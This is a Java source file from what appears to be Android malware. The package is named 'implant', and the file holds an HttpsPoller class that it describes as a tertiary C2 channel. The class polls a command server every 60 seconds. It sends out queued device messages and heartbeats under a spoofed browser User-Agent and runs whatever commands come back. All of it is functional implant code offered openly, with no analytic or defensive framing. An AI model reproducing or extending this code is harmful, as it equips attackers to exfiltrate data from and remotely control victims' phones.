// ============================================================
// FILE 16: comms/HttpsPoller.java
// ============================================================
package io.hackerai.implant.comms;

import android.content.Context;
import android.os.Build;
import android.util.Log;

import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * HttpsPoller — tertiary C2 channel via HTTPS polling.
 *
 * Polls C2 endpoint every 60s, sending queued messages as POST body
 * and receiving commands in the response.
 *
 * This is the most reliable (but highest latency) channel.
 */
public class HttpsPoller {
    private static final String TAG = "HttpsPoller";
    private static final long POLL_INTERVAL_MS = 60_000L; // 60s

    private final Context ctx;
    private final String baseUrl;
    private final String implantId;
    private final LinkedBlockingQueue<String> outbox;
    private final AtomicBoolean running = new AtomicBoolean(false);

    public HttpsPoller(Context ctx, String baseUrl, String implantId,
                       LinkedBlockingQueue<String> outbox) {
        this.ctx = ctx.getApplicationContext();
        this.baseUrl = baseUrl;
        this.implantId = implantId;
        this.outbox = outbox;
    }

    public void start() {
        if (!running.compareAndSet(false, true)) return;
        Thread poller = new Thread(() -> {
            Log.i(TAG, "HTTPS poller started.");
            while (running.get()) {
                try {
                    poll();
                } catch (Exception e) {
                    Log.e(TAG, "Poll error", e);
                }
                try {
                    Thread.sleep(POLL_INTERVAL_MS);
                } catch (InterruptedException e) {
                    break;
                }
            }
            Log.i(TAG, "HTTPS poller stopped.");
        }, "https-poller");
        poller.setDaemon(true);
        poller.start();
    }

    public void stop() {
        running.set(false);
    }

    /** Single poll cycle: drain outbox, POST to C2, process response */
    private void poll() {
        try {
            // Collect pending messages
            StringBuilder batch = new StringBuilder("[");
            boolean first = true;
            while (true) {
                String msg = outbox.poll(100, TimeUnit.MILLISECONDS);
                if (msg == null) break;
                if (!first) batch.append(",");
                batch.append(msg);
                first = false;
            }
            batch.append("]");

            String body = batch.toString();
            if (body.equals("[]") || body.equals("[null]")) {
                // Send empty heartbeat
                JSONObject hb = new JSONObject();
                hb.put("type", "hb");
                hb.put("ts", System.currentTimeMillis());
                hb.put("id", implantId);
                body = "[" + hb.toString() + "]";
            }

            // POST to C2
            URL url = new URL(baseUrl + "/poll");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setRequestProperty("X-Implant-Id", implantId);
            conn.setRequestProperty("User-Agent",
                    "Mozilla/5.0 (Linux; Android " + Build.VERSION.RELEASE + ")");
            conn.setDoOutput(true);
            conn.setConnectTimeout(15_000);
            conn.setReadTimeout(30_000);

            byte[] bodyBytes = body.getBytes(StandardCharsets.UTF_8);
            conn.setFixedLengthStreamingMode(bodyBytes.length);
            try (OutputStream os = conn.getOutputStream()) {
                os.write(bodyBytes);
                os.flush();
            }

            int responseCode = conn.getResponseCode();
            if (responseCode == 200) {
                // Read response for commands
                java.io.BufferedReader reader = new java.io.BufferedReader(
                        new java.io.InputStreamReader(conn.getInputStream(), "UTF-8"));
                StringBuilder response = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    response.append(line);
                }
                reader.close();

                String cmdStr = response.toString().trim();
                if (!cmdStr.isEmpty()) {
                    Log.d(TAG, "C2 response: " + cmdStr);
                    ChannelClient client = ChannelClient.getInstance(ctx);
                    if (client != null) {
                        // Could be single command or array
                        if (cmdStr.startsWith("[")) {
                            // Array of commands
                            // Simplified: parse as single for now
                            client.processCommand(cmdStr);
                        } else {
                            client.processCommand(cmdStr);
                        }
                    }
                }
            }

            conn.disconnect();

        } catch (Exception e) {
            Log.e(TAG, "HTTPS poll failed: " + e.getMessage());
        }
    }
}
